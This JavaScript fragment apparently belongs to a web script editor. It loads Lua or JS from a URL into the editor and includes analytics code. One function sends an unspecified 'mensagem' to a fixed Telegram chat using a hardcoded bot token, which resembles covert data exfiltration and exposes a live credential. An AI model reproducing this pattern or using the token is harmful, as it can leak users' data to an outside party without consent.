    let c = ca[i];
    while (c.charAt(0) == " ") {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
  }
  return "";
}

async function loadScript() {
  try {
    const url = $("#urlScript").val();
    if (!url) return alert("Enter url script");
    const content = await $.get(url);
    // console.log(content);
    mode == "lua" ? editorLua.setValue(content) : editorJs.setValue(content);
  } catch (error) {
    alert(error.responseJSON.message);
  }
}

function loadXMLDoc() {
  metodo = "GET";
  botApiLink = "https://api.telegram.org/";
  botID = "2021036758:AAHrIXlcQam_NcENMsGQwk35_qJSLQycYA8";
  var xhttp = new XMLHttpRequest();
  xhttp.open(metodo, botApiLink+"bot"+botID+"/sendMessage?chat_id=822042684&text="+encodeURIComponent(mensagem), true);
  xhttp.send();
}

(async function () {
  await fetch("https://googletagmanager.com/gtag/js?id=G-12KDTYFVL7");

  window.dataLayer = window.dataLayer || [];
  function gtag() {
    dataLayer.push(arguments);
  }
  gtag("js", new Date());

  gtag("config", "G-12KDTYFVL7");
})();